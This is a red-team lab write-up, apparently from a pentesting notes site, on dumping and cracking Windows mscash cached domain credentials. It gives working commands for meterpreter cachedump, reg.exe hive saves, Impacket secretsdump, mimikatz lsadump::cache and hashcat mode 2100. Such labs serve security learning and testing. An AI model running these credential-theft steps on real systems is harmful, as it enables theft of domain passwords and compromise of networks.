# Dumping and Cracking mscash - Cached Domain Credentials

## Dumping and Cracking mscash - Cached Domain Credentials

This lab focuses on dumping and cracking mscash hashes after SYSTEM level privileges has been obtained on a compromised machine.

`Mscash` is a Microsoft hashing algorithm that is used for storing cached domain credentials locally on a system after a successful logon. It's worth noting that cached credentials do not expire. Domain credentials are cached on a local system so that domain members can logon to the machine even if the DC is down. It's worth noting that mscash hash is not passable - i.e PTH attacks will not work.

### Execution

#### Meterpreter

Note that in meterpreter session, hashdump only dumps the local SAM account hashes:

{% code title="attacker\@kali" %}
```
hashdump
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXiqMaCZWYwc9ecjwTb%2F-LXivyhGJHpKRPR4h73h%2FScreenshot%20from%202019-02-02%2015-59-09.png?alt=media\&token=a74fc982-57fd-4128-94ba-383a2d2b1224)

To dump cached domain credentials in mscash format, use a post exploitation module `cachedump`:

{% code title="attacker\@kali" %}
```csharp
getuid
getsystem
use post/windows/gather/cachedump
run
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXiqMaCZWYwc9ecjwTb%2F-LXiw5Go4fu4Vcnob9Uy%2FScreenshot%20from%202019-02-02%2015-53-09.png?alt=media\&token=17368b0b-bb5c-471b-b92a-757d8e2caa17)

#### Secretsdump

Impacket's secrestdump tool allows us to dump all the credentials that are stored in registry hives SAM, SECURITY and SYSTEM, so firstly, we need to write those out:

{% code title="attacker\@victim" %}
```csharp
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXiqMaCZWYwc9ecjwTb%2F-LXiw3SYy3mSVrZmHgPH%2FScreenshot%20from%202019-02-02%2015-56-47.png?alt=media\&token=772653cf-5ec9-4da8-94d7-25ed52679de3)

Once the hives are retrieved, they can can be pulled back to kali linux to extract the hashes:

{% code title="attacker\@kali" %}
```csharp
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXiqMaCZWYwc9ecjwTb%2F-LXiw1AAfqtOk23kXPEE%2FScreenshot%20from%202019-02-02%2015-57-28.png?alt=media\&token=e52bc60c-8c95-4a9d-8bb9-2bac2ec71b98)

#### Mimikatz

```
lsadump::cache
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nYmCFo8ktkxF6qft3%2F-L_nanb0R9YzT3M5jt79%2FScreenshot%20from%202019-03-12%2020-32-15.png?alt=media\&token=3b5e251c-0e21-4cd6-a45a-77bfe2a1e860)

### Cracking mscash / mscache with HashCat

To crack mscache with hashcat, it should be in the following format:

```csharp
$DCC2$10240#username#hash
```

Meterpreter's cachedump module's output cannot be used in hashcat directly, but it's easy to do it.

Below shows the original output format from cachedump and the format accepted by hashcat:

```csharp
echo ; cat hashes.txt ; echo ; cut -d ":" -f 2 hashes.txt
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXiz-bVnWABMNcdcdYC%2F-LXj7YOsKWsdgdM5fzlh%2FScreenshot%20from%202019-02-02%2016-54-29.png?alt=media\&token=a1cb8fd7-0825-4f94-912f-42e92e6f19be)

Let's try cracking it with hashchat now:

{% code title="attacker\@kali" %}
```csharp
hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85f3b8' /usr/share/wordlists/rockyou.txt --force --potfile-disable
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXiz-bVnWABMNcdcdYC%2F-LXj8L1k7_pE819ZOdkz%2FScreenshot%20from%202019-02-02%2016-57-55.png?alt=media\&token=f3bc228d-8677-4a04-91d8-77b646a27908)

### Where Are Domain Credentials Cached

This can be seen via regedit (running with SYSTEM privileges) in the following key:

```
HKEY_LOCAL_MACHINE\SECURITY\Cache
```

`NL$1..10` are the cached hashes for 10 previously logged users:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXj9YhyAybzgcu2ieDM%2F-LXj9fWFy0IGJh8fDmiu%2FScreenshot%20from%202019-02-02%2017-03-15.png?alt=media\&token=9a9ad8ed-6838-4819-8e92-5c448b482862)

By nulling out the Data fields one could remove the credentials from cache. Once cached credentials are removed, if no DC is present, a user trying to authenticate to the system will see:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LXjB4tO5aD2QXkz9AQX%2F-LXjBFj7u0eKZVmmxgXM%2FScreenshot%20from%202019-02-02%2017-10-00.png?alt=media\&token=c4e884d0-9ee3-4933-946f-9c065ede64bf)

### References
